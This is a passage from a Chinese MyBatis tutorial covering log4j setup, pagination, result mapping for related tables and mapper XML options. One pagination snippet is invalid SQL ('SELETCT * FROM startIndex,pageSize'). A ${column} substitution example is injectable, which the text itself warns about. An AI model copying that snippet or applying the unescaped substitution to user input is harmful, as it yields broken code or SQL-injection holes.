org.apache.log4j.ConsoleAppenderlog4j.appender.console.Target = System.outlog4j.appender.console.Threshold=DEBUGlog4j.appender.console.layout = org.apache.log4j.PatternLayoutlog4j.appender.console.layout.ConversionPattern=【%c】-%m%n#文件输出的相关设置log4j.appender.file = org.apache.log4j.RollingFileAppenderlog4j.appender.file.File=./log/xyq.loglog4j.appender.file.MaxFileSize=10mblog4j.appender.file.Threshold=DEBUGlog4j.appender.file.layout=org.apache.log4j.PatternLayoutlog4j.appender.file.layout.ConversionPattern=【%p】【%d&#123;yy-MM-dd&#125;】【%c】%m%n#日志输出级别log4j.logger.org.mybatis=DEBUGlog4j.logger.java.sql=DEBUGlog4j.logger.java.sql.Statement=DEBUGlog4j.logger.java.sql.ResultSet=DEBUGlog4j.logger.java.sql.PreparedStatement=DEBUG 3.配置log4j为日志的实现 123&lt;settings&gt; &lt;setting name=&quot;logImpl&quot; value=&quot;STDOUT_LOGGING&quot;/&gt; &lt;/settings&gt; 4.Log4j的使用：测试查询 简单使用： 1.在要使用的Log4j的类中，导入import org.apache.log4j.Logger; 1import org.apache.log4j.Logger; 2.生成日志对象，参数为当期类的class 1static Logger logger = Logger.getLogger(CustomerMapperTest.class); 3.测试使用 123456@Test public void test3log4j()&#123; logger.info(&quot;info:进入了test3log4j方法&quot;); logger.debug(&quot;debug:进入了test3log4j方法&quot;); logger.error(&quot;error:进入了test3log4j&quot;); &#125; 4.日志级别 info debug error …… 6.分页 为什么要分页？ 减少数据的处理量 6.1Limit分页使用limit实现分页： 12SELETCT * FROM startIndex,pageSize;# 单参代表：从0开始的n个数据项 使用Mybatis实现分页的核心是sql 接口 1List&lt;Customer&gt; getUserByLimit(Map&lt;String,Integer&gt; map); Mapper.xml 123&lt;select id=&quot;getUserByLimit&quot; parameterType=&quot;map&quot; resultMap=&quot;UserLimit&quot;&gt; select * from customersdb.account limit #&#123;startIndex&#125;,#&#123;pageSize&#125;; &lt;/select&gt; 测试 123456789101112@Test public void test4()&#123; SqlSession sqlSession = MybatisUtils.getSqlSession(); CustomerMapper mapper = sqlSession.getMapper(CustomerMapper.class); HashMap&lt;String, Integer&gt; map = new HashMap&lt;String, Integer&gt;(); map.put(&quot;startIndex&quot;,0); map.put(&quot;pageSize&quot;,2); List&lt;Customer&gt; userByLimit = mapper.getUserByLimit(map); System.out.println(userByLimit); sqlSession.close(); &#125; 6.2 RowBounds分页不再使用SQL实现分页 接口 12//分页2 List&lt;Customer&gt; getUserByRowBounds(); Mapper.xml 1234&lt;!--分页2--&gt; &lt;select id=&quot;getUserByRowBounds&quot; resultMap=&quot;UserMap&quot;&gt; select * from customersdb.account; &lt;/select&gt; 测试 1234567891011121314@Testpublic void test5()&#123; SqlSession sqlSession = MybatisUtils.getSqlSession(); //通过RowBounds实现 RowBounds rowBounds = new RowBounds(1, 2); // 通过java代码层面实现分页 List&lt;Customer&gt; userList = sqlSession.selectList(&quot;com.xyq.dao.CustomerMapper.getUserByRowBounds&quot;,null,rowBounds); for (Customer customer : userList) &#123; System.out.println(customer); &#125; sqlSession.close();&#125; 6.3分页插件mybatis分页插件 – PageHelper 7.使用注解开发7.1 面向接口编程 大家之前都学过面向对象编程,也学习过接口，但在真正的开发中，很多时候我们会选择面向接口编程 根本原因：==解耦==, 可拓展,提高复用，分层开发中，上层不用管具体的实现，大家都遵守共同的标准.，使得开发变。根本原因:解隅，可拓展，提高复用.分层开发中，上层不用管具体的实现，大家都遵守共同的标准.使得开发变得容易，规范性更好。 在一个面向对象的系统中，系统的各种功能是由许许多多的不同对象协作完成的。在这种情况下，各个对象内部是如何实现自己的，对系统设计人员来讲就不那么重要了; 而各个对象之间的协作关系则成为系统设计的关键。小到不同类之间的通信，大到各模块之间的交互，在系统设计之初都是要着重考虑的，这也是系统设计的主要工作内容。面向接口编程就是指按照这种思想来编程。 关于接口的理解 接口从更深层次的理解，应是定义(规范,约束)与实现(名实分离的原则)的分离。 接口的本身反映了系统设计人员对系统的抽象理解。。接口应有两类： 第一类是对一个个体的抽象，它可对应为-一个抽象体(abstract cass); 第二类是对一个个体某一方面的抽象，即形成一个抽象面(interface) ; 一个体有可能有多个抽象面。抽象体与抽象面是有区别的。 三个面向区别 面向对象是指，我们考虑问题时，以对象为单位，考虑它的属性及方法。 面向过程是指，我们考虑问题时，以一个具体的流程（事务过程）为单位，考虑它的实现。 接口设计与非接口设计是针对复用技术而言，与面向对象（过程）不是一个问题。更多的体现就是对系统整体的架构。 7.2 使用注解开发 注解在接口上实现 需要在核心配置文件中绑定接口 测试 本质：反射机制实现 底层：动态代理！ Mybatis详细的执行流程 7.3详细执行流程7.4注解增删改查8.Lombok 安装插件 导入jar包 123456&lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.18.12&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt; 在实体类上添加注解 使用 9.多对一处理 集合：一对多 一个老师有很多个学生 关联：多对一 多个学生对应一个老师 9.1搭建测试环境搭建数据库 配置好： mybatis-config.xml Teacher和Student类 StudentMapper和TeacherMapper StudentMapper.xml和TeacherMapper.xml 9.2按照查询嵌套处理 123456789101112131415161718192021222324252627282930313233&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.xyq.dao.StudentMapper&quot;&gt; &lt;!-- 1.查询所有的学生信息 2.根据查询出来的tid查询对应的老师 子查询 --&gt; &lt;select id=&quot;getStudentInfo&quot; resultMap=&quot;StudentTeacher&quot;&gt; select * from student AS A, teacher AS B Where A.tid = B.id; &lt;/select&gt; &lt;resultMap id=&quot;StudentTeacher&quot; type=&quot;com.xyq.pojo.Student&quot;&gt; &lt;result property=&quot;id&quot; column=&quot;id&quot;/&gt; &lt;result property=&quot;name&quot; column=&quot;name&quot;/&gt; &lt;!-- 复杂的属性我们需要单独处理 对象：association 集合：collection --&gt; &lt;association property=&quot;teacher&quot; column=&quot;tid&quot; javaType=&quot;com.xyq.pojo.Teacher&quot; select=&quot;getTeacher&quot;/&gt; &lt;/resultMap&gt; &lt;select id=&quot;getTeacher&quot; resultType=&quot;com.xyq.pojo.Teacher&quot;&gt; select * from teacher where id = #&#123;id&#125; &lt;/select&gt;&lt;/mapper&gt; 1234567891011@Testpublic void test1()&#123; SqlSession sqlSession = MybatisUtils.getSqlSession(); StudentMapper mapper = sqlSession.getMapper(StudentMapper.class); List&lt;Student&gt; studentInfo = mapper.getStudentInfo(); for (Student student : studentInfo) &#123; System.out.println(student); &#125; sqlSession.close();&#125; 9.3按照结果嵌套处理 1234567891011121314151617181920&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.xyq.dao.StudentMapper&quot;&gt; &lt;!--按照结果嵌套处理--&gt; &lt;select id=&quot;getStudentInfo2&quot; resultMap=&quot;StudentTeacher2&quot;&gt; select A.id sid,A.name sname,B.name tname from student AS A,teacher AS B Where A.tid = B.id; &lt;/select&gt; &lt;resultMap id=&quot;StudentTeacher2&quot; type=&quot;com.xyq.pojo.Student&quot;&gt; &lt;result property=&quot;id&quot; column=&quot;sid&quot;/&gt; &lt;result property=&quot;name&quot; column=&quot;sname&quot;/&gt; &lt;association property=&quot;teacher&quot; javaType=&quot;com.xyq.pojo.Teacher&quot;&gt; &lt;result property=&quot;name&quot; column=&quot;tname&quot;/&gt; &lt;/association&gt; &lt;/resultMap&gt;&lt;/mapper&gt; 1234567891011@Test public void test1()&#123; SqlSession sqlSession = MybatisUtils.getSqlSession(); StudentMapper mapper = sqlSession.getMapper(StudentMapper.class); List&lt;Student&gt; studentInfo = mapper.getStudentInfo2(); for (Student student : studentInfo) &#123; System.out.println(student); &#125; sqlSession.close(); &#125; 回顾Mysql多对一查询方式： 子查询 联表查询 10.一对多处理10.1搭建测试环境 实体类 接口 1234public interface TeacherMapper &#123; // 获取老师 List&lt;Teacher&gt; getTeacher();&#125; TeacherMapper.xml 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.xyq.dao.TeacherMapper&quot;&gt; &lt;select id=&quot;getTeacher&quot; resultType=&quot;com.xyq.pojo.Teacher&quot;&gt; select * from teacher; &lt;/select&gt;&lt;/mapper&gt; 测试 12345678910@Test public void test()&#123; SqlSession sqlSession = MybatisUtils.getSqlSession(); TeacherMapper mapper = sqlSession.getMapper(TeacherMapper.class); List&lt;Teacher&gt; teacher = mapper.getTeacher(); for (Teacher teacher1 : teacher) &#123; System.out.println(teacher1); &#125; sqlSession.close(); &#125; 10.2按照查询嵌套处理 接口 1Teacher getTeacher3(@Param(&quot;tid&quot;) int id); TeacherMapper.xml 1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.xyq.dao.TeacherMapper&quot;&gt; &lt;!--按查询嵌套处理--&gt; &lt;select id=&quot;getTeacher3&quot; resultMap=&quot;TeacherStudent2&quot;&gt; select * from teacher where id = #&#123;tid&#125; &lt;/select&gt; &lt;resultMap id=&quot;TeacherStudent2&quot; type=&quot;com.xyq.pojo.Teacher&quot;&gt; &lt;collection property=&quot;students&quot; javaType=&quot;ArrayList&quot; ofType=&quot;com.xyq.pojo.Student&quot; select=&quot;getStudentByTeacherID&quot; column=&quot;id&quot;/&gt; &lt;/resultMap&gt; &lt;select id=&quot;getStudentByTeacherID&quot; resultType=&quot;com.xyq.pojo.Student&quot;&gt; select * from student where tid = #&#123;tid&#125; &lt;/select&gt;&lt;/mapper&gt; 测试 12345678@Testpublic void test2()&#123; SqlSession sqlSession = MybatisUtils.getSqlSession(); TeacherMapper mapper = sqlSession.getMapper(TeacherMapper.class); Teacher teacher2 = mapper.getTeacher3(1); System.out.println(teacher2); sqlSession.close();&#125; 10.3按照结果嵌套处理 接口 12// 获取指定老师下的所有学生以及老师的信息 Teacher getTeacher2(@Param(&quot;tid&quot;) int id); xml 1234567891011121314151617181920212223242526272829&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.xyq.dao.TeacherMapper&quot;&gt; &lt;select id=&quot;getTeacher&quot; resultType=&quot;com.xyq.pojo.Teacher&quot;&gt; select * from teacher; &lt;/select&gt; &lt;!--按结果嵌套查询--&gt; &lt;select id=&quot;getTeacher2&quot; resultMap=&quot;TeacherStudent&quot;&gt; select s.id sid,s.name sname,t.name tname,t.id tid from teacher t,student s where s.tid = t.id and t.id = #&#123;tid&#125;; &lt;/select&gt; &lt;resultMap id=&quot;TeacherStudent&quot; type=&quot;com.xyq.pojo.Teacher&quot;&gt; &lt;result property=&quot;id&quot; column=&quot;tid&quot;/&gt; &lt;result property=&quot;name&quot; column=&quot;tname&quot;/&gt; &lt;!-- javaType指定属性的类型 集合中的泛型信息，我们使用ofType获取 --&gt; &lt;collection property=&quot;students&quot; ofType=&quot;com.xyq.pojo.Student&quot;&gt; &lt;result property=&quot;id&quot; column=&quot;sid&quot;/&gt; &lt;result property=&quot;name&quot; column=&quot;sname&quot;/&gt; &lt;result property=&quot;tid&quot; column=&quot;tid&quot;/&gt; &lt;/collection&gt; &lt;/resultMap&gt;&lt;/mapper&gt; 测试 1234567891011121314151617181920212223package com;import com.xyq.dao.StudentMapper;import com.xyq.dao.TeacherMapper;import com.xyq.pojo.Student;import com.xyq.pojo.Teacher;import com.xyq.utils.MybatisUtils;import org.apache.ibatis.session.SqlSession;import org.junit.Test;import java.util.List;public class MyTest &#123; @Test public void test()&#123; SqlSession sqlSession = MybatisUtils.getSqlSession(); TeacherMapper mapper = sqlSession.getMapper(TeacherMapper.class); Teacher teacher2 = mapper.getTeacher2(1); System.out.println(teacher2); sqlSession.close(); &#125;&#125; 10.4 小结 关联 - association【多对一】 集合 - collection【一对多】 javaType：javaType用来指定实体类中属性的类型 ofType：用来指定映射到List或集合中的pojo类型，泛型中的约束类型 10.5建议 面试高频： 慢SQL问题 Mysql引擎 InnoDB底层原理 索引 索引优化 11. XML映射器官方文档学习 SQL 映射文件顶级元素： cache – 该命名空间的缓存配置 cache-ref – 引用其它命名空间的缓存配置 resultMap – 描述如何从数据库结果集中加载对象，是最复杂也是最强大的元素 sql – 可被其它语句引用的可重用语句块 insert – 映射插入语句 update – 映射更新语句 delete – 映射删除语句 select – 映射查询语句 11.1 SELECTselect的属性 属性 描述 id 在命名空间中唯一的标识符，可以被用来引用这条语句。 parameterType 将会传入这条语句的参数的类全限定名或别名。这个属性是可选的，因为 MyBatis 可以通过类型处理器（TypeHandler）推断出具体传入语句的参数，默认值为未设置（unset）。 resultType 期望从这条语句中返回结果的类全限定名或别名。 注意，如果返回的是集合，那应该设置为集合包含的类型，而不是集合本身的类型。 resultType 和 resultMap 之间只能同时使用一个。 resultMap 对外部 resultMap 的命名引用。结果映射是 MyBatis 最强大的特性，如果你对其理解透彻，许多复杂的映射问题都能迎刃而解。 resultType 和 resultMap 之间只能同时使用一个。 flushCache 将其设置为 true 后，只要语句被调用，都会导致本地缓存和二级缓存被清空，默认值：false。 useCache 将其设置为 true 后，将会导致本条语句的结果被二级缓存缓存起来，默认值：对 select 元素为 true。 timeout 这个设置是在抛出异常之前，驱动程序等待数据库返回请求结果的秒数。默认值为未设置（unset）（依赖数据库驱动）。 fetchSize 这是一个给驱动的建议值，尝试让驱动程序每次批量返回的结果行数等于这个设置值。 默认值为未设置（unset）（依赖驱动）。 statementType 可选 STATEMENT，PREPARED 或 CALLABLE。这会让 MyBatis 分别使用 Statement，PreparedStatement 或 CallableStatement，默认值：PREPARED。 resultSetType FORWARD_ONLY，SCROLL_SENSITIVE, SCROLL_INSENSITIVE 或 DEFAULT（等价于 unset） 中的一个，默认值为 unset （依赖数据库驱动）。 databaseId 如果配置了数据库厂商标识（databaseIdProvider），MyBatis 会加载所有不带 databaseId 或匹配当前 databaseId 的语句；如果带和不带的语句都有，则不带的会被忽略。 resultOrdered 这个设置仅针对嵌套结果 select 语句：如果为 true，将会假设包含了嵌套结果集或是分组，当返回一个主结果行时，就不会产生对前面结果集的引用。 这就使得在获取嵌套结果集的时候不至于内存不够用。默认值：false。 resultSets 这个设置仅适用于多结果集的情况。它将列出语句执行后返回的结果集并赋予每个结果集一个名称，多个名称之间以逗号分隔。 11.2 INSERT、UPDATE、DELETEinsert、update、delete的属性 属性 描述 id 在命名空间中唯一的标识符，可以被用来引用这条语句。 parameterType 将会传入这条语句的参数的类全限定名或别名。这个属性是可选的，因为 MyBatis 可以通过类型处理器（TypeHandler）推断出具体传入语句的参数，默认值为未设置（unset）。 flushCache 将其设置为 true 后，只要语句被调用，都会导致本地缓存和二级缓存被清空，默认值：（对 insert、update 和 delete 语句）true。 timeout 这个设置是在抛出异常之前，驱动程序等待数据库返回请求结果的秒数。默认值为未设置（unset）（依赖数据库驱动）。 statementType 可选 STATEMENT，PREPARED 或 CALLABLE。这会让 MyBatis 分别使用 Statement，PreparedStatement 或 CallableStatement，默认值：PREPARED。 useGeneratedKeys （仅适用于 insert 和 update）这会令 MyBatis 使用 JDBC 的 getGeneratedKeys 方法来取出由数据库内部生成的主键（比如：像 MySQL 和 SQL Server 这样的关系型数据库管理系统的自动递增字段），默认值：false。 keyProperty （仅适用于 insert 和 update）指定能够唯一识别对象的属性，MyBatis 会使用 getGeneratedKeys 的返回值或 insert 语句的 selectKey 子元素设置它的值，默认值：未设置（unset）。如果生成列不止一个，可以用逗号分隔多个属性名称。 keyColumn （仅适用于 insert 和 update）设置生成键值在表中的列名，在某些数据库（像 PostgreSQL）中，当主键列不是表中的第一列的时候，是必须设置的。如果生成列不止一个，可以用逗号分隔多个属性名称。 databaseId 如果配置了数据库厂商标识（databaseIdProvider），MyBatis 会加载所有不带 databaseId 或匹配当前 databaseId 的语句；如果带和不带的语句都有，则不带的会被忽略。 例： 1234567891011121314151617&lt;insert id=&quot;insertAuthor&quot;&gt; insert into Author (id,username,password,email,bio) values (#&#123;id&#125;,#&#123;username&#125;,#&#123;password&#125;,#&#123;email&#125;,#&#123;bio&#125;)&lt;/insert&gt;&lt;update id=&quot;updateAuthor&quot;&gt; update Author set username = #&#123;username&#125;, password = #&#123;password&#125;, email = #&#123;email&#125;, bio = #&#123;bio&#125; where id = #&#123;id&#125;&lt;/update&gt;&lt;delete id=&quot;deleteAuthor&quot;&gt; delete from Author where id = #&#123;id&#125;&lt;/delete&gt; 首先，如果你的数据库支持自动生成主键的字段（比如 MySQL 和 SQL Server），那么你可以设置 useGeneratedKeys=”true”，然后再把 keyProperty 设置为目标属性就 OK 了。例如，如果上面的 Author 表已经在 id 列上使用了自动生成，那么语句可以修改为： 12345&lt;insert id=&quot;insertAuthor&quot; useGeneratedKeys=&quot;true&quot; keyProperty=&quot;id&quot;&gt; insert into Author (username,password,email,bio) values (#&#123;username&#125;,#&#123;password&#125;,#&#123;email&#125;,#&#123;bio&#125;)&lt;/insert&gt; 如果你的数据库还支持多行插入, 你也可以传入一个 Author 数组或集合，并返回自动生成的主键。 1234567&lt;insert id=&quot;insertAuthor&quot; useGeneratedKeys=&quot;true&quot; keyProperty=&quot;id&quot;&gt; insert into Author (username, password, email, bio) values &lt;foreach item=&quot;item&quot; collection=&quot;list&quot; separator=&quot;,&quot;&gt; (#&#123;item.username&#125;, #&#123;item.password&#125;, #&#123;item.email&#125;, #&#123;item.bio&#125;) &lt;/foreach&gt;&lt;/insert&gt; 对于不支持自动生成主键列的数据库和可能不支持自动生成主键的 JDBC 驱动，MyBatis 有另外一种方法来生成主键。 这里有一个简单（也很傻）的示例，它可以生成一个随机 ID（不建议实际使用，这里只是为了展示 MyBatis 处理问题的灵活性和宽容度）： 123456789&lt;insert id=&quot;insertAuthor&quot;&gt; &lt;selectKey keyProperty=&quot;id&quot; resultType=&quot;int&quot; order=&quot;BEFORE&quot;&gt; select CAST(RANDOM()*1000000 as INTEGER) a from SYSIBM.SYSDUMMY1 &lt;/selectKey&gt; insert into Author (id, username, password, email,bio, favourite_section) values (#&#123;id&#125;, #&#123;username&#125;, #&#123;password&#125;, #&#123;email&#125;, #&#123;bio&#125;, #&#123;favouriteSection,jdbcType=VARCHAR&#125;)&lt;/insert&gt; 在上面的示例中，首先会运行 selectKey 元素中的语句，并设置 Author 的 id，然后才会调用插入语句。这样就实现了数据库自动生成主键类似的行为，同时保持了 Java 代码的简洁。 selectKeys属性 属性 描述 keyProperty selectKey 语句结果应该被设置到的目标属性。如果生成列不止一个，可以用逗号分隔多个属性名称。 keyColumn 返回结果集中生成列属性的列名。如果生成列不止一个，可以用逗号分隔多个属性名称。 resultType 结果的类型。通常 MyBatis 可以推断出来，但是为了更加准确，写上也不会有什么问题。MyBatis 允许将任何简单类型用作主键的类型，包括字符串。如果生成列不止一个，则可以使用包含期望属性的 Object 或 Map。 order 可以设置为 BEFORE 或 AFTER。如果设置为 BEFORE，那么它首先会生成主键，设置 keyProperty 再执行插入语句。如果设置为 AFTER，那么先执行插入语句，然后是 selectKey 中的语句 - 这和 Oracle 数据库的行为相似，在插入语句内部可能有嵌入索引调用。 statementType 和前面一样，MyBatis 支持 STATEMENT，PREPARED 和 CALLABLE 类型的映射语句，分别代表 Statement, PreparedStatement 和 CallableStatement 类型。 11.3 SQL这个元素可以用来定义可重用的 SQL 代码片段，以便在其它语句中使用。 参数可以静态地（在加载的时候）确定下来，并且可以在不同的 include 元素中定义不同的参数值。比如： 12&lt;sql id=&quot;userColumns&quot;&gt; $&#123;alias&#125;.id,$&#123;alias&#125;.username,$&#123;alias&#125;.password &lt;/sql&gt; 这个 SQL 片段可以在其它语句中使用，例如： 1234567&lt;select id=&quot;selectUsers&quot; resultType=&quot;map&quot;&gt; select &lt;include refid=&quot;userColumns&quot;&gt;&lt;property name=&quot;alias&quot; value=&quot;t1&quot;/&gt;&lt;/include&gt;, &lt;include refid=&quot;userColumns&quot;&gt;&lt;property name=&quot;alias&quot; value=&quot;t2&quot;/&gt;&lt;/include&gt; from some_table t1 cross join some_table t2&lt;/select&gt; 也可以在 include 元素的 refid 属性或内部语句中使用属性值，例如： 1234567891011121314151617&lt;sql id=&quot;sometable&quot;&gt; $&#123;prefix&#125;Table&lt;/sql&gt;&lt;sql id=&quot;someinclude&quot;&gt; from &lt;include refid=&quot;$&#123;include_target&#125;&quot;/&gt;&lt;/sql&gt;&lt;select id=&quot;select&quot; resultType=&quot;map&quot;&gt; select field1, field2, field3 &lt;include refid=&quot;someinclude&quot;&gt; &lt;property name=&quot;prefix&quot; value=&quot;Some&quot;/&gt; &lt;property name=&quot;include_target&quot; value=&quot;sometable&quot;/&gt; &lt;/include&gt;&lt;/select&gt; 11.4 参数之前见到的所有语句都使用了简单的参数形式。但实际上，参数是 MyBatis 非常强大的元素。对于大多数简单的使用场景，你都不需要使用复杂的参数，比如： 12345&lt;select id=&quot;selectUsers&quot; resultType=&quot;User&quot;&gt; select id, username, password from users where id = #&#123;id&#125;&lt;/select&gt; 上面的这个示例说明了一个非常简单的命名参数映射。鉴于参数类型（parameterType）会被自动设置为 int，这个参数可以随意命名。原始类型或简单数据类型（比如 Integer 和 String）因为没有其它属性，会用它们的值来作为参数。 然而，如果传入一个复杂的对象，行为就会有点不一样了。比如： 1234&lt;insert id=&quot;insertUser&quot; parameterType=&quot;User&quot;&gt; insert into users (id, username, password) values (#&#123;id&#125;, #&#123;username&#125;, #&#123;password&#125;)&lt;/insert&gt; 如果 User 类型的参数对象传递到了语句中，会查找 id、username 和 password 属性，然后将它们的值传入预处理语句的参数中。 对传递语句参数来说，这种方式真是干脆利落。不过参数映射的功能远不止于此。 首先，和 MyBatis 的其它部分一样，参数也可以指定一个特殊的数据类型。 1#&#123;property,javaType=int,jdbcType=NUMERIC&#125; 和 MyBatis 的其它部分一样，几乎总是可以根据参数对象的类型确定 javaType，除非该对象是一个 HashMap。这个时候，你需要显式指定 javaType 来确保正确的类型处理器（TypeHandler）被使用。 提示 JDBC 要求，如果一个列允许使用 null 值，并且会使用值为 null 的参数，就必须要指定 JDBC 类型（jdbcType）。阅读 PreparedStatement.setNull()的 JavaDoc 来获取更多信息。 提示 要更进一步地自定义类型处理方式，可以指定一个特殊的类型处理器类（或别名），比如： 1#&#123;age,javaType=int,jdbcType=NUMERIC,typeHandler=MyTypeHandler&#125; 参数的配置好像越来越繁琐了，但实际上，很少需要如此繁琐的配置。 对于数值类型，还可以设置 numericScale 指定小数点后保留的位数。 1#&#123;height,javaType=double,jdbcType=NUMERIC,numericScale=2&#125; 最后，mode 属性允许你指定 IN，OUT 或 INOUT 参数。如果参数的 mode 为 OUT 或 INOUT，将会修改参数对象的属性值，以便作为输出参数返回。 如果 mode 为 OUT（或 INOUT），而且 jdbcType 为 CURSOR（也就是 Oracle 的 REFCURSOR），你必须指定一个 resultMap 引用来将结果集 ResultMap 映射到参数的类型上。要注意这里的 javaType 属性是可选的，如果留空并且 jdbcType 是 CURSOR，它会被自动地被设为 ResultMap。 1#&#123;department, mode=OUT, jdbcType=CURSOR, javaType=ResultSet, resultMap=departmentResultMap&#125; MyBatis 也支持很多高级的数据类型，比如结构体（structs），但是当使用 out 参数时，你必须显式设置类型的名称。比如（再次提示，在实际中要像这样不能换行）： 1#&#123;middleInitial, mode=OUT, jdbcType=STRUCT, jdbcTypeName=MY_TYPE, resultMap=departmentResultMap&#125; 尽管上面这些选项很强大，但大多时候，你只须简单指定属性名，顶多要为可能为空的列指定 jdbcType，其他的事情交给 MyBatis 自己去推断就行了。 123#&#123;firstName&#125;#&#123;middleInitial,jdbcType=VARCHAR&#125;#&#123;lastName&#125; 11.5 字符串替换默认情况下，使用 #&#123;&#125; 参数语法时，MyBatis 会创建 PreparedStatement 参数占位符，并通过占位符安全地设置参数（就像使用 ? 一样）。 这样做更安全，更迅速，通常也是首选做法，不过有时你就是想直接在 SQL 语句中直接插入一个不转义的字符串。 比如 ORDER BY 子句，这时候你可以： 1ORDER BY $&#123;columnName&#125; 这样，MyBatis 就不会修改或转义该字符串了。 当 SQL 语句中的元数据（如表名或列名）是动态生成的时候，字符串替换将会非常有用。 举个例子，如果你想 select 一个表任意一列的数据时，不需要这样写： 12345678910@Select(&quot;select * from user where id = #&#123;id&#125;&quot;)User findById(@Param(&quot;id&quot;) long id);@Select(&quot;select * from user where name = #&#123;name&#125;&quot;)User findByName(@Param(&quot;name&quot;) String name);@Select(&quot;select * from user where email = #&#123;email&#125;&quot;)User findByEmail(@Param(&quot;email&quot;) String email);// 其它的 &quot;findByXxx&quot; 方法 而是可以只写这样一个方法： 12@Select(&quot;select * from user where $&#123;column&#125; = #&#123;value&#125;&quot;)User findByColumn(@Param(&quot;column&quot;) String column, @Param(&quot;value&quot;) String value); 其中 $&#123;column&#125; 会被直接替换，而 #&#123;value&#125; 会使用 ? 预处理。 这样，就能完成同样的任务： 123User userOfId1 = userMapper.findByColumn(&quot;id&quot;, 1L);User userOfNameKid = userMapper.findByColumn(&quot;name&quot;, &quot;kid&quot;);User userOfEmail = userMapper.findByColumn(&quot;email&quot;, &quot;noone@nowhere.com&quot;); 这种方式也同样适用于替换表名的情况。 提示 用这种方式接受用户的入，并用作语句参数是不安全的，会导致潜在的 **SQL 注入**攻击。因此，要么不允许用户输入这些字段，要么自行转义并检验这些参数。 11.6 结果映射resultMap 元素是 MyBatis 中最重要最强大的元素。它可以让你从 90% 的 JDBC ResultSets 数据提取代码中解放出来，并在一些情形下允许你进行一些 JDBC 不支持的操作。实际上，在为一些比如连接的复杂语句编写映射代码的时候，一份 resultMap 能够代替实现同等功能的数千行代码。ResultMap 的设计思想是，对简单的语句做到零配置，对于复杂一点的语句，只需要描述语句之间的关系就行了。 之前你已经见过简单映射语句的示例，它们没有显式指定 resultMap。比如： 12345&lt;select id=&quot;selectUsers&quot; resultType=&quot;map&quot;&gt; select id, username, hashedPassword from some_table where id = #&#123;id&#125;&lt;/select&gt; 上述语句只是简单地将所有的列映射到 HashMap 的键上，这由 resultType 属性指定。虽然在大部分情况下都够用，但是 HashMap 并不是一个很好的领域模型。你的程序更可能会使用 JavaBean 或 POJO（Plain Old Java Objects，普通老式 Java 对象）作为领域模型。MyBatis 对两者都提供了支持。看看下面这个 JavaBean： 12345678910111213141516171819202122232425package com.someapp.model;public class User &#123; private int id; private String username; private String hashedPassword; public int getId() &#123; return id; &#125; public void setId(int id) &#123; this.id = id; &#125; public String getUsername() &#123; return username; &#125; public void setUsername(String username) &#123; this.username = username; &#125; public String getHashedPassword() &#123; return hashedPassword; &#125; public void setHashedPassword(String hashedPassword) &#123; this.hashedPassword = hashedPassword; &#125;&#125; 基于 JavaBean 的规范，上面这个类有 3 个属性：id，username，hashedPassword。这些属性会对应到 select 语句中的列名。 这样的一个 JavaBean 可以被映射到 ResultSet，就像映射到 HashMap 一样简单。 12345&lt;select id=&quot;selectUsers&quot; resultType=&quot;com.someapp.model.User&quot;&gt; select id, username, hashedPassword from some_table where id = #&#123;id&#125;&lt;/select&gt; 类型别名是你的好帮手。使用它们，你就可以不用输入类的全限定名了。比如： 123456789&lt;!-- mybatis-config.xml 中 --&gt;&lt;typeAlias type=&quot;com.someapp.model.User&quot; alias=&quot;User&quot;/&gt;&lt;!-- SQL 映射 XML 中 --&gt;&lt;select id=&quot;selectUsers&quot; resultType=&quot;User&quot;&gt; select id, username, hashedPassword from some_table where id = #&#123;id&#125;&lt;/select&gt; 在这些情况下，MyBatis 会在幕后自动创建一个 ResultMap，再根据属性名来映射列到 JavaBean 的属性上。如果列名和属性名不能匹配上，可以在 SELECT 语句中设置列别名（这是一个基本的 SQL 特性）来完成匹配。比如： 12345678&lt;select id=&quot;selectUsers&quot; resultType=&quot;User&quot;&gt; select user_id as &quot;id&quot;, user_name as &quot;userName&quot;, hashed_password as &quot;hashedPassword&quot; from some_table where id = #&#123;id&#125;&lt;/select&gt; 在学习了上面的知识后，你会发现上面的例子没有一个需要显式配置 ResultMap，这就是 ResultMap 的优秀之处——你完全可以不用显式地配置它们。 虽然上面的例子不用显式配置 ResultMap。 但为了讲解，我们来看看如果在刚刚的示例中，显式使用外部的 resultMap 会怎样，这也是解决列名不匹配的另外一种方式。 12345&lt;resultMap id=&quot;userResultMap&quot; type=&quot;User&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;user_id&quot; /&gt; &lt;result property=&quot;username&quot; column=&quot;user_name&quot;/&gt; &lt;result property=&quot;password&quot; column=&quot;hashed_password&quot;/&gt;&lt;/resultMap&gt; 然后在引用它的语句中设置 resultMap 属性就行了（注意我们去掉了 resultType 属性）。比如: 12345&lt;select id=&quot;selectUsers&quot; resultMap=&quot;userResultMap&quot;&gt; select user_id, user_name, hashed_password from some_table where id = #&#123;id&#125;&lt;/select&gt; 如果这个世界总是这么简单就好了! 11.7高级结果映射MyBatis 